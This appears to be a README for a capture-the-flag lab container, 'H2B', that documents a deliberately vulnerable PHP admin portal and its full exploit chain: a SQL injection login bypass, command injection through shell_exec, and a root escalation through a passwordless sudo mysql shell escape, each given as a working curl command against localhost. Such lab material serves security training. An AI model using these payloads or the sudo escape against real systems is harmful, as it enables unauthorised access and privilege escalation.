# Machine H2B: Admin Portal & MySQL Pager Escape

**Series:** Hour 2
**Port:** 10011
**Difficulty:** Medium
**Service:** Apache2, PHP 8.1, MySQL (admin_panel)

## 🎯 Overview

H2B simulates a scenario where an attacker bypasses a legacy login portal using SQL Injection, gains a foothold via command injection on an internal dashboard, and finally escalates to root by abusing a passwordless `sudo` entry for the MySQL client.

## 🪲 Vulnerabilities

1. **SQL Injection (Auth Bypass):** The login form on `index.php` is vulnerable to a classic `' OR 1=1 -- -` bypass due to direct string concatenation in the query.
2. **Authenticated Command Injection:** The `admin.php` dashboard features a "Directory Lister" utility that passes user input directly into `shell_exec()`, allowing for arbitrary system commands.
3. **Sudo Misconfiguration:** The `www-data` user has `NOPASSWD` access to `/usr/bin/mysql` in the `/etc/sudoers` file.

## ⚔️ The Kill Chain (Exploit Path)

### 1. Initial Access (SQLi Auth Bypass)

The attacker bypasses the login screen to establish a session.

```bash
# Log in and save the session cookie
curl -i -c cookie.txt -d "username=admin' OR 1=1 -- -" -d "password=x" -X POST http://127.0.0.1:10011/index.php
```

### 2. Foothold (Command Injection)

Verify code execution as the `www-data` user through the authenticated dashboard.

```bash
curl -s -b cookie.txt -d "dir=.; whoami" -X POST http://127.0.0.1:10011/admin.php
```

### 3. Privilege Escalation (MySQL Batch Escape)

Since the web shell is non-interactive (no TTY), the attacker cannot use interactive shell escapes. Instead, they use the MySQL `-e` (execute) flag combined with the `\!` shell escape to write the flag as root.

```bash
curl -s -b cookie.txt -d "dir=.; sudo mysql -e '\! echo Team_Name > /root/king.txt'" -X POST http://127.0.0.1:10011/admin.php
```

## 🛠️ Build & Deployment

```bash
# Build the container
docker build -t koth_h2b .

# Run with port mapping
docker run -d -p 10011:80 --name koth_h2b koth_h2b

# Verify Coronation
docker exec -u root koth_h2b cat /root/king.txt
```

---

### 📝 Technical Notes for Orchestrator

- **Database Connection:** The application is configured to connect to `127.0.0.1` rather than `localhost` to force TCP usage and avoid UNIX socket permission issues between `www-data` and MySQL.
- **PHP Error Handling:** `mysqli_report(MYSQLI_REPORT_OFF)` is enabled to prevent PHP 8 from throwing uncaught exceptions on SQL errors, ensuring a smoother "classic" CTF experience for participants.
- **Race Condition:** The `Dockerfile` entrypoint utilizes `mysqladmin ping` to ensure the database is fully initialized before the `setup.sql` is imported.

---
